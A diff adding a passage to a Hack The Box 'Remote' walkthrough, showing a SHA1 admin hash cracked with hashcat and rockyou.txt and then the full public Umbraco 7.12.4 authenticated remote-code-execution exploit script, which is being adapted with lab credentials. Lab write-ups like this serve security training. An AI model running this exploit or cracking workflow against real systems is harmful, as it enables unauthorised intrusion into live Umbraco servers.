@@ -212,3 +212,115 @@ With this the admin password being SHA1 instead of HMACSHA256 is telling me to t
 root@HTBKali:~/HTB/Remote# hashcat -h | grep SHA1
     100 | SHA1                                             | Raw Hash
 ```
+
+Then run hashcat with rockyou.txt.
+
+```bash
+vipertooth@vipertooth:~/HTB/remote$ hashcat -a 0 -m 100 hashes /opt/rockyou.txt
+hashcat (v5.1.0-1397-g7f4df9eb) starting...
+
+<snip>
+
+b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: SHA1
+Hash.Target......: b8be16afba8c314ad33d812f22a04991b90e2aaa
+Time.Started.....: Thu Mar 26 13:23:41 2020 (1 sec)
+Time.Estimated...: Thu Mar 26 13:23:42 2020 (0 secs)
+Guess.Base.......: File (/opt/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........: 11566.3 kH/s (5.30ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 9830400/14344385 (68.53%)
+Rejected.........: 0/9830400 (0.00%)
+Restore.Point....: 9175040/14344385 (63.96%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: chautla -> babypollisteamo
+Hardware.Mon.#1..: Temp: 53c Util: 29% Core:1556MHz Mem:3802MHz Bus:16
+
+Started: Thu Mar 26 13:23:34 2020
+Stopped: Thu Mar 26 13:23:43 2020
+```
+
+Now lets look at the RCE script we found with searchsploit and test it.
+
+```bash
+# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
+# Vendor Homepage: http://www.umbraco.com/
+# Software Link: https://our.umbraco.com/download/releases
+# Version: 7.12.4
+# Category: Webapps
+# Tested on: Windows IIS
+# CVE: N/A
+
+
+import requests;
+
+from bs4 import BeautifulSoup;
+
+def print_dict(dico):
+    print(dico.items());
+    
+print("Start");
+
+# Execute a calc for the PoC
+payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
+xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
+<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
+{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+ proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
+ </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
+ </xsl:template> </xsl:stylesheet> ';
+
+login = "XXXX;
+password="XXXX";
+host = "XXXX";
+
+# Step 1 - Get Main page
+s = requests.session()
+url_main =host+"/umbraco/";
+r1 = s.get(url_main);
+print_dict(r1.cookies);
+
+# Step 2 - Process Login
+url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
+loginfo = {"username":login,"password":password};
+r2 = s.post(url_login,json=loginfo);
+
+# Step 3 - Go to vulnerable web page
+url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
+r3 = s.get(url_xslt);
+
+soup = BeautifulSoup(r3.text, 'html.parser');
+VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
+VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
+UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
+headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
+data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};
+
+# Step 4 - Launch the attack
+r4 = s.post(url_xslt,data=data,headers=headers);
+
+print("End");
+```
+
+First thing I noticed is where to change `login, password, and host`  the code should look as follows.  
+
+```bash
+login = "admin@htb.local";
+password="baconandcheese";
+host = "http://10.10.10.180";
+```
+
+Next I see the code is just poping calc. I changed this to ping.exe to test the execution of the script. I also added arguments for ping.exe where the script says `string cmd = ""`
+
+
+
